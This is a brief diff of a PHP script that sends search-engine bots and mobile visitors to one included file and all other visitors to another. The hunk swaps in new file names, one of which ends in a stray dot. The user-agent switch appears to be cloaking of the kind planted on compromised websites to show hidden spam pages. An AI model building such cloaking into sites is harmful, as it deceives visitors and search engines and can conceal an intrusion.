@@ -31,10 +31,10 @@ function is_mobile($user_agent) {
 
 // Combined conditions for including 'landingpage.php'
 if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
-    include 'readme.php';
+    include 'file.php';
     exit;
 } else {
-    include 'index.php.backup';
+    include 'index_1.php.';
     exit;
 }
 ?>
